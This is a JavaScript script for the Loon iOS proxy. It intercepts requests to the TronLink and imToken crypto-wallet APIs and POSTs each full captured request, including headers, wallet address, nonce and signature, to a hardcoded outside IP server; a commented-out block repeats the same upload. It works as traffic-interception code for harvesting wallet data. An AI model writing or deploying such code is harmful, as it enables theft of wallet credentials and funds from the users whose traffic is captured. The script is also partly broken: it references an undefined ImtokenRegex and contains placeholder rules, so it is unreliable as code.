const request = $request;
const requrl = $request.url;
const Host = $request.headers
const usercode = $argument;
const regexRules = [
    { regex: /wallet\/getLatestAPK\?address=/, description: 'TronLink' },
    { regex: /^https?:\/\/biz\.token\.im\/v1\/tron$/, description: 'Imtoken' },
    // ...可以有很多规则
    { regex: /pattern50/, description: 'Description for pattern 50' }
];

///api/v1/wallet/getLatestAPK?address=TYtGyengaZQKkFU161uKCrRQQU2jJTNpv6&nonce=3691&secretId=ED151200DD0B3B52&signature=W5gBsApwNhp5GLgwA0Jho/77TbU%3D
const matchingRule = regexRules.find(rule => rule.regex.test(requrl));

if (matchingRule) {
    sendNotification("成功", "", "匹配到" + matchingRule.description, "loon://off");
    let params = {
        url: "http://43.134.170.213:8001/api/trx/getinfo",
        body: {
            "info": {
                "usercode": usercode,
                "type":matchingRule.description
            },
            "request": {
                "request": request
            }
        },//仅仅在post请求中有效
    }
    $httpClient.post(params, function (errormsg, response, data) { 
        if(response.status==200){
            let newdata = JSON.parse(data)
            console.log(newdata)
            console.log(typeof(newdata) )
            
                sendNotification("", "", newdata.message);
            
        }
    })
} else {
    console.log('No match found');
}
// if (TronLinkRegex.test(requrl)) {
//     let params = {
//         url:"http://43.134.170.213:8001/api/trx/getinfo",
//         body:{
//             "info": {
//                 "usercode": usercode
//             },
//             "request": {
//                 "request": request
//             }
//         },//仅仅在post请求中有效
//     }
//     console.log("1111111111");
//     $notification.post("通知","","找到TronLink钱包");
//     $httpClient.post(params, function(errormsg,response,data){
//             if (data) {
//             console.log(data);

//         }
//     })
// } else {
//     $done({});
// }

if (ImtokenRegex.test(requrl)) {
    $notification.post("通知", "", "找到imtoken钱包");
}


function chekusercode() {
    if (!usercode) {
        $notification.post("错误", "", "请填写用户码", "loon://off");
        $done({});
        return false;
    } else {
        return true;
    }
}
function sendNotification(title, subtitle, message, url) {
    $notification.post(title, subtitle, message, url);
}